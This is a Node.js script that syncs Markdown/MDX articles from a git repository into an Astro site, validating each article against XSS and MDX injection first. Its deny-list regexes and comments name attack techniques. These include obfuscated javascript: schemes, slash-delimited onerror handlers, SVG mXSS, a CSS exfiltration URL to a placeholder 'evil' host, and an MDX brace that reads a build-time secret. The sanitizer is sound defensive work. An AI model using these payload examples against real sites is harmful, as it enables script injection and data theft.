import fs from 'fs';
import path from 'path';
import matter from 'gray-matter';
import { execFileSync } from 'child_process';
import { fileURLToPath, pathToFileURL } from 'url';
import { hasLocalImagePathTraversal, isUnsafeImageUrl } from '../src/lib/article-image-assets.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const projectRoot = path.resolve(__dirname, '..');
const defaultArticlesRoot = path.resolve(projectRoot, '..', 'taopedia-articles');
const articlesRoot = process.env.TAOPEDIA_ARTICLES_DIR
  ? path.resolve(process.env.TAOPEDIA_ARTICLES_DIR)
  : defaultArticlesRoot;
const articlesRepoRef = process.env.TAOPEDIA_ARTICLES_REF || 'main';
const cacheArticlesRoot = path.join(projectRoot, '.cache', 'taopedia-articles');
let sourceRoot = path.join(articlesRoot, 'content', 'pages');
const targetRoot = path.join(projectRoot, 'src', 'content', 'pages');
const allowedAssetExtensions = new Set(['.avif', '.gif', '.jpg', '.jpeg', '.json', '.png', '.webp']);
const maxAssetBytes = 5 * 1024 * 1024;
// Astro template directives execute at build time and must never appear in
// article content. They are checked twice — literally below, and again after
// entity/zero-width deobfuscation (see obfuscatedSchemePatterns) — so an
// obfuscated spelling like `set&colon;html` or `set:ht{soft-hyphen}ml` cannot
// slip the literal scan, exactly as the dangerous URL schemes are. Shared by
// both scans so the two lists cannot drift and cover a different directive set.
const directivePatterns = [
  { pattern: /\bset:[a-z-]+\b/i, reason: 'set directives are not allowed in article content' },
  { pattern: /\bclass:list\b/i, reason: 'class:list directives are not allowed in article content' },
  { pattern: /\bclient:[a-z-]+\b/i, reason: 'client directives are not allowed in article content' },
  { pattern: /\bserver:[a-z-]+\b/i, reason: 'server directives are not allowed in article content' },
  { pattern: /\btransition:[a-z-]+\b/i, reason: 'transition directives are not allowed in article content' },
  { pattern: /\bis:[a-z-]+\b/i, reason: 'is directives are not allowed in article content' },
  { pattern: /\bdefine:[a-z-]+\b/i, reason: 'define directives are not allowed in article content' },
];

const unsafeContentPatterns = [
  { pattern: /^\s*import\s/m, reason: 'MDX imports are not allowed in article content' },
  { pattern: /^\s*export\s/m, reason: 'MDX exports are not allowed in article content' },
  { pattern: /<\s*script[\s>]/i, reason: 'script tags are not allowed in article content' },
  { pattern: /<\s*\/\s*script\s*>/i, reason: 'script tags are not allowed in article content' },
  { pattern: /<\s*(base|frame|frameset|iframe|object|embed|link|meta|style|form|input|button|textarea|select|option|fieldset|legend|datalist|output)\b/i, reason: 'active HTML elements are not allowed in article content' },
  // <svg> and <math> are foreign-content roots: a browser parses their subtree
  // with XML/foreign rules, which is a classic mXSS vector (e.g. an <svg> can
  // carry <foreignObject> HTML, animation elements that retarget attributes, or
  // namespaced links). Article bodies are plain glossary prose and never need
  // either element, so block them outright rather than relying on the script /
  // handler / scheme scans alone.
  { pattern: /<\s*(svg|math)\b/i, reason: 'SVG and MathML elements are not allowed in article content' },
  { pattern: /\sslot\s*=/i, reason: 'slot attributes are not allowed in article content' },
  // The <style> element is already blocked above, but an inline `style=`
  // attribute on any allowed element is the matching gap: it lets injected CSS
  // exfiltrate data (`background:url(//evil/?leak)`), overlay/clickjack the page
  // (`position:fixed`), or spoof content — all with no script, handler, or
  // flagged scheme. Article bodies are plain prose, so the attribute is blocked.
  { pattern: /\sstyle\s*=/i, reason: 'inline style attributes are not allowed in article content' },
  { pattern: /\sxmlns(?:\s*:\s*[\w-]+)?\s*=\s*/i, reason: 'xmlns attributes are not allowed in article content' },
  { pattern: /\son[a-z]+\s*=/i, reason: 'inline event handlers are not allowed in article content' },
  // The `ping` attribute on an <a> (an allowed element) turns a normal-looking
  // link into a tracking beacon: clicking it makes the browser POST to every
  // listed URL, leaking the reader's referrer and click to an attacker with no
  // script, handler, or flagged scheme. Article links never need it, so block it.
  { pattern: /\sping\s*=/i, reason: 'ping attributes are not allowed in article content' },
  { pattern: /\bjavascript\s*:/i, reason: 'javascript: URLs are not allowed in article content' },
  { pattern: /\bvbscript\s*:/i, reason: 'vbscript: URLs are not allowed in article content' },
  { pattern: /\bdata\s*:\s*text\/html/i, reason: 'HTML data URLs are not allowed in article content' },
  { pattern: /\bdata\s*:\s*image\/svg\+xml/i, reason: 'SVG data URLs are not allowed in article content' },
  { pattern: /\bdata\s*:\s*application\/xhtml\+xml/i, reason: 'XHTML data URLs are not allowed in article content' },
  { pattern: /\bdata\s*:\s*(?:text|application)\/(?:javascript|ecmascript)/i, reason: 'script data URLs are not allowed in article content' },
  ...directivePatterns,
];

// Dangerous URL schemes can be smuggled past the literal checks above using HTML
// numeric/named entities, control characters, or zero-width characters that a
// browser strips when resolving a URL (e.g. `java&#115;cript:`,
// `javascript&colon;`, `java\tscript:`). Decode those forms before re-scanning.
const obfuscatedSchemePatterns = [
  { pattern: /javascript\s*:/i, reason: 'javascript: URLs are not allowed in article content' },
  { pattern: /vbscript\s*:/i, reason: 'vbscript: URLs are not allowed in article content' },
  { pattern: /data\s*:\s*text\/html/i, reason: 'HTML data URLs are not allowed in article content' },
  { pattern: /data\s*:\s*image\/svg\+xml/i, reason: 'SVG data URLs are not allowed in article content' },
  { pattern: /data\s*:\s*application\/xhtml\+xml/i, reason: 'XHTML data URLs are not allowed in article content' },
  { pattern: /data\s*:\s*(?:text|application)\/(?:javascript|ecmascript)/i, reason: 'script data URLs are not allowed in article content' },
  ...directivePatterns,
];

const infoboxRowValueSchemePatterns = [
  /javascript\s*:/i,
  /vbscript\s*:/i,
  /data\s*:\s*text\/html/i,
  /data\s*:\s*image\/svg\+xml/i,
  /data\s*:\s*application\/xhtml\+xml/i,
  /data\s*:\s*(?:text|application)\/(?:javascript|ecmascript)/i,
];

function assertSafeInfoboxRowValue(value, filePath, index) {
  const decoded = decodeForSchemeScan(value);
  for (const pattern of infoboxRowValueSchemePatterns) {
    if (pattern.test(value) || pattern.test(decoded)) {
      throw new Error(
        `Invalid infobox JSON asset in "${filePath}": rows[${index}].value contains a disallowed URL scheme`,
      );
    }
  }
}

// The whitespace-anchored handler pattern above misses handlers that HTML lets
// follow an attribute with a non-space delimiter — a slash (`<img src=x/onerror=…>`)
// or a quote abutting the handler (`<a href="x"onclick=…>`). Browsers still parse
// these. Detecting them must NOT scan inside quoted attribute values, or a benign
// URL such as `src="/online=1"` would be flagged. So the scan runs against a copy
// with quoted values emptied: the URL text inside them is removed, while the
// closing quote (a real attribute boundary) is preserved so `"x"onclick=` is caught.
const nonSpaceDelimitedHandlerPattern = /<[^>]*[/"'`]on[a-z]+\s*=/i;

function emptyQuotedAttributeValues(content) {
  return content.replace(/"[^"]*"/g, '""').replace(/'[^']*'/g, "''");
}

const hiddenTopics = new Set(['bittensor']);

function normalizeCategoryLabel(value) {
  return typeof value === 'string' ? value.trim() : '';
}

function isPublishedArticle(data) {
  return data.draft !== true;
}

export function toCategories(data) {
  const categories = new Map();
  const addCategory = (rawValue) => {
    const normalized = normalizeCategoryLabel(rawValue);
    if (!normalized) return;
    const key = normalized.toLowerCase();
    if (hiddenTopics.has(key)) return;
    if (!categories.has(key)) categories.set(key, normalized);
  };

  if (typeof data.category === 'string') {
    addCategory(data.category);
  }
  if (Array.isArray(data.categories)) {
    for (const category of data.categories) addCategory(category);
  }
  if (Array.isArray(data.tags)) {
    for (const tag of data.tags) addCategory(tag);
  }
  return Array.from(categories.values());
}

function validateSlug(slug) {
  if (!/^[a-z0-9][a-z0-9_-]*$/.test(slug)) {
    throw new Error(`Unsafe article slug "${slug}". Use lowercase letters, numbers, underscores, and hyphens.`);
  }
}

function isPathInside(rootPath, candidatePath) {
  const relative = path.relative(rootPath, candidatePath);
  return relative === ''
    || (relative !== '..' && !relative.startsWith(`..${path.sep}`) && !path.isAbsolute(relative));
}

export function assertRegularFileInside(root, filePath, description = 'File') {
  const stat = fs.lstatSync(filePath);
  if (stat.isSymbolicLink()) {
    throw new Error(`${description} must not be a symlink: ${filePath}`);
  }
  if (!stat.isFile()) {
    throw new Error(`${description} must be a regular file: ${filePath}`);
  }

  const rootRealPath = fs.realpathSync(root);
  const fileRealPath = fs.realpathSync(filePath);
  if (!isPathInside(rootRealPath, fileRealPath)) {
    throw new Error(`${description} must be inside article source root: ${filePath}`);
  }

  return stat;
}

// Articles may be authored as index.mdx or plain Markdown index.md. The content
// sanitizer rejects every MDX-specific feature, so index.md is a natural source
// format, and copyDir, the content-collection glob, and the history walker all
// already accept both. Resolve whichever the directory provides (preferring
// index.mdx) and run the same security validation, so a valid index.md article
// is published instead of being silently skipped. Returns null when neither
// index file exists; other validation failures (symlink, traversal) still throw.
export function resolveArticleSourceFile(sourceDir, sourceRoot, description = 'Article entry') {
  for (const name of ['index.mdx', 'index.md']) {
    const candidate = path.join(sourceDir, name);
    try {
      assertRegularFileInside(sourceRoot, candidate, description);
      return candidate;
    } catch (error) {
      if (error?.code === 'ENOENT') continue;
      throw error;
    }
  }
  return null;
}

function fromCodePoint(codePoint, fallback) {
  return Number.isInteger(codePoint) && codePoint >= 0 && codePoint <= 0x10ffff
    ? String.fromCodePoint(codePoint)
    : fallback;
}

// Remove characters a browser ignores inside a URL — C0/C1 control characters
// (including tab/newline/CR), DEL, zero-width characters and the BOM — while
// preserving the ordinary space (U+0020) so plain prose such as "Java Script:"
// is never collapsed into a false positive.
// Unicode "default ignorable" format characters (zero-width spaces/joiners, soft
// hyphen U+00AD, word joiner U+2060, bidi marks, BOM, ...) are invisible and can be
// used to obfuscate a dangerous scheme: "java" + U+00AD + "script:" collapses to
// "javascript:" once the ignorable character is dropped. Strip the whole class, not
// a hand-picked subset of zero-width chars, so the scheme scan cannot be evaded by
// an ignorable character the original list happened to miss.
const DEFAULT_IGNORABLE_PATTERN = /\p{Default_Ignorable_Code_Point}/u;

function stripUrlObfuscationChars(value) {
  let result = '';
  for (const char of value) {
    const code = char.codePointAt(0);
    const isControl = code <= 0x1f || code === 0x7f || (code >= 0x80 && code <= 0x9f);
    if (!isControl && !DEFAULT_IGNORABLE_PATTERN.test(char)) {
      result += char;
    }
  }
  return result;
}

function decodeEntityPass(content) {
  return content
    .replace(/&#x([0-9a-f]+);?/gi, (match, hex) => fromCodePoint(Number.parseInt(hex, 16), match))
    .replace(/&#(\d+);?/g, (match, dec) => fromCodePoint(Number.parseInt(dec, 10), match))
    // Normalize the named HTML entities for characters a scheme or MIME type can hide
    // behind, so an entity-spelled separator cannot evade the scan: ":" (&colon;),
    // "/" (&sol;) and "+" (&plus;) each decode in a browser the same as their numeric
    // (e.g. &#43;) and literal forms, so all three spellings must collapse alike.
    .replace(/&colon;/gi, ':')
    .replace(/&sol;/gi, '/')
    .replace(/&plus;/gi, '+')
    .replace(/&(?:tab|newline);/gi, '')
    .replace(/&amp;/gi, '&');
}

function decodeForSchemeScan(content) {
  let decoded = content;
  let previous;
  do {
    previous = decoded;
    decoded = decodeEntityPass(previous);
  } while (decoded !== previous);
  return stripUrlObfuscationChars(decoded);
}

function blankRange(chars, start, end) {
  for (let index = start; index < end; index += 1) {
    if (chars[index] !== '\n' && chars[index] !== '\r') {
      chars[index] = ' ';
    }
  }
}

function stripMarkdownBlockCode(content, chars) {
  let inFence = false;
  let fenceChar = '';
  let fenceLength = 0;

  for (let lineStart = 0; lineStart < content.length;) {
    const newlineIndex = content.indexOf('\n', lineStart);
    const lineEnd = newlineIndex === -1 ? content.length : newlineIndex + 1;
    const rawLine = content.slice(lineStart, lineEnd);
    const lineText = rawLine.replace(/\r?\n$/, '');

    if (inFence) {
      blankRange(chars, lineStart, lineEnd);
      const closingFence = new RegExp(`^ {0,3}${fenceChar}{${fenceLength},}\\s*$`);
      if (closingFence.test(lineText)) {
        inFence = false;
      }
      lineStart = lineEnd;
      continue;
    }

    const openingFence = lineText.match(/^(?: {0,3})(`{3,}|~{3,})/);
    if (openingFence) {
      inFence = true;
      fenceChar = openingFence[1][0];
      fenceLength = openingFence[1].length;
      blankRange(chars, lineStart, lineEnd);
      lineStart = lineEnd;
      continue;
    }

    // Do NOT treat a 4-space / tab indented line as a code block. MDX disables
    // CommonMark indented code blocks (they collide with JSX indentation), so an
    // indented `{...}` is parsed as a live MDX expression, not inert code — e.g.
    // `- item\n\n    {process.env.SECRET_TOKEN}` evaluates at build time. Blanking
    // indented lines here would hide that brace from findUnescapedMdxBrace and let
    // a build-time secret read past the scan. Only real MDX code spans (fences,
    // handled above, and inline backticks) are stripped.
    lineStart = lineEnd;
  }
}

function stripMarkdownInlineCode(content, chars) {
  for (let index = 0; index < content.length; index += 1) {
    if (content[index] !== '`' || chars[index] === ' ') continue;

    let tickCount = 1;
    while (content[index + tickCount] === '`') tickCount += 1;

    const marker = '`'.repeat(tickCount);
    const closingIndex = content.indexOf(marker, index + tickCount);
    if (closingIndex === -1) {
      index += tickCount - 1;
      continue;
    }

    blankRange(chars, index, closingIndex + tickCount);
    index = closingIndex + tickCount - 1;
  }
}

function stripMarkdownCode(content) {
  const chars = content.split('');
  stripMarkdownBlockCode(content, chars);
  stripMarkdownInlineCode(content, chars);
  return chars.join('');
}

function isEscapedBrace(content, braceIndex) {
  let backslashes = 0;
  for (let index = braceIndex - 1; index >= 0 && content[index] === '\\'; index -= 1) {
    backslashes += 1;
  }
  return backslashes % 2 === 1;
}

function findUnescapedMdxBrace(content) {
  for (let index = 0; index < content.length; index += 1) {
    const char = content[index];
    if ((char === '{' || char === '}') && !isEscapedBrace(content, index)) {
      return char;
    }
  }
  return null;
}

export function validateArticleContent(slug, content) {
  for (const { pattern, reason } of unsafeContentPatterns) {
    if (pattern.test(content)) {
      throw new Error(`Unsafe article content in "${slug}": ${reason}`);
    }
  }

  if (nonSpaceDelimitedHandlerPattern.test(emptyQuotedAttributeValues(content))) {
    throw new Error(`Unsafe article content in "${slug}": inline event handlers are not allowed in article content`);
  }

  const decoded = decodeForSchemeScan(content);
  for (const { pattern, reason } of obfuscatedSchemePatterns) {
    if (pattern.test(decoded)) {
      throw new Error(`Unsafe article content in "${slug}": ${reason}`);
    }
  }

  const markdownBody = matter(content).content;
  if (findUnescapedMdxBrace(stripMarkdownCode(markdownBody))) {
    throw new Error(`Unsafe article content in "${slug}": MDX expression braces are not allowed in article content`);
  }
}

export function validateArticleJsonAsset(filePath) {
  let data;
  try {
    data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
  } catch (error) {
    throw new Error(`Malformed JSON asset in "${filePath}": ${error.message}`);
  }

  if (path.basename(filePath) === 'infobox.json') {
    validateInfoboxJsonAsset(filePath, data);
  }
}

function isPlainObject(value) {
  return typeof value === 'object' && value !== null && !Array.isArray(value);
}

function assertOptionalString(value, fieldName, filePath) {
  if (value !== undefined && typeof value !== 'string') {
    throw new Error(`Invalid infobox JSON asset in "${filePath}": ${fieldName} must be a string`);
  }
}

export function validateInfoboxJsonAsset(filePath, data) {
  if (!isPlainObject(data)) {
    throw new Error(`Invalid infobox JSON asset in "${filePath}": root must be an object`);
  }

  assertOptionalString(data.title, 'title', filePath);
  assertOptionalString(data.image, 'image', filePath);
  assertOptionalString(data.caption, 'caption', filePath);

  if (typeof data.image === 'string' && data.image.trim()) {
    if (isUnsafeImageUrl(data.image) || hasLocalImagePathTraversal(data.image)) {
      throw new Error(`Invalid infobox JSON asset in "${filePath}": image URL is not allowed`);
    }
  }

  if (data.rows === undefined) return;
  if (!Array.isArray(data.rows)) {
    throw new Error(`Invalid infobox JSON asset in "${filePath}": rows must be an array`);
  }

  data.rows.forEach((row, index) => {
    if (!isPlainObject(row)) {
      throw new Error(`Invalid infobox JSON asset in "${filePath}": rows[${index}] must be an object`);
    }
    if (typeof row.label !== 'string') {
      throw new Error(`Invalid infobox JSON asset in "${filePath}": rows[${index}].label must be a string`);
    }
    if (typeof row.value !== 'string') {
      throw new Error(`Invalid infobox JSON asset in "${filePath}": rows[${index}].value must be a string`);
    }
    assertSafeInfoboxRowValue(row.value, filePath, index);
  });
}

const frontmatterImageFields = ['coverImage', 'infoboxImage', 'image'];

export function validateFrontmatterImageFields(slug, data) {
  if (!isPlainObject(data)) return;

  for (const field of frontmatterImageFields) {
    const value = data[field];
    if (typeof value === 'string' && value.trim()) {
      if (isUnsafeImageUrl(value) || hasLocalImagePathTraversal(value)) {
        throw new Error(`Unsafe frontmatter image in "${slug}": ${field} URL is not allowed`);
      }
    }
  }
}

function copyDir(src, dest) {
  fs.mkdirSync(dest, { recursive: true });
  for (const entry of fs.readdirSync(src, { withFileTypes: true })) {
    const srcPath = path.join(src, entry.name);
    const destPath = path.join(dest, entry.name);
    if (entry.isSymbolicLink()) {
      throw new Error(`Symlinked article source entry is not allowed: ${srcPath}`);
    }
    if (entry.isDirectory()) {
      copyDir(srcPath, destPath);
    } else if (entry.isFile() && entry.name !== 'index.mdx' && entry.name !== 'index.md') {
      const ext = path.extname(entry.name).toLowerCase();
      if (!allowedAssetExtensions.has(ext)) {
        throw new Error(`Unsupported asset type in "${srcPath}". Allowed: ${Array.from(allowedAssetExtensions).join(', ')}`);
      }
      const stat = assertRegularFileInside(src, srcPath, 'Article asset');
      if (stat.size > maxAssetBytes) {
        throw new Error(`Asset too large in "${srcPath}". Maximum size is ${maxAssetBytes} bytes.`);
      }
      if (ext === '.json') {
        validateArticleJsonAsset(srcPath);
      }
      fs.copyFileSync(srcPath, destPath);
    }
  }
}

function main() {
  if (!fs.existsSync(sourceRoot)) {
    fs.mkdirSync(path.dirname(cacheArticlesRoot), { recursive: true });
    if (!fs.existsSync(cacheArticlesRoot)) {
      execFileSync('git', [
        'clone',
        '--depth=1',
        '--branch',
        articlesRepoRef,
        'https://github.com/e35ventura/taopedia-articles.git',
        cacheArticlesRoot,
      ], { stdio: 'inherit' });
    } else {
      execFileSync('git', ['-C', cacheArticlesRoot, 'fetch', '--depth=1', 'origin', articlesRepoRef], { stdio: 'inherit' });
      execFileSync('git', ['-C', cacheArticlesRoot, 'checkout', '--detach', 'FETCH_HEAD'], { stdio: 'inherit' });
    }
    sourceRoot = path.join(cacheArticlesRoot, 'content', 'pages');
  }

  if (!fs.existsSync(sourceRoot)) {
    throw new Error(`Article source not found: ${sourceRoot}`);
  }

  fs.rmSync(targetRoot, { recursive: true, force: true });
  fs.mkdirSync(targetRoot, { recursive: true });

  let synced = 0;
  for (const entry of fs.readdirSync(sourceRoot, { withFileTypes: true })) {
    if (!entry.isDirectory()) continue;

    const slug = entry.name;
    validateSlug(slug);
    const sourceDir = path.join(sourceRoot, slug);
    const sourceFile = resolveArticleSourceFile(sourceDir, sourceRoot, `Article entry "${slug}"`);
    if (!sourceFile) continue;

    const raw = fs.readFileSync(sourceFile, 'utf8');
    validateArticleContent(slug, raw);
    const parsed = matter(raw);
    validateFrontmatterImageFields(slug, parsed.data);
    if (!isPublishedArticle(parsed.data)) continue;

    const data = { ...parsed.data, categories: toCategories(parsed.data) };
    delete data.category;
    delete data.tags;

    const targetDir = path.join(targetRoot, slug);
    fs.mkdirSync(targetDir, { recursive: true });
    copyDir(sourceDir, targetDir);
    fs.writeFileSync(path.join(targetDir, 'index.mdx'), matter.stringify(parsed.content, data));
    synced += 1;
  }

  console.log(`Synced ${synced} published articles from taopedia-articles`);
}

// Only run the sync when executed directly, so tests can import the validators.
if (process.argv[1] && pathToFileURL(process.argv[1]).href === import.meta.url) {
  main();
}
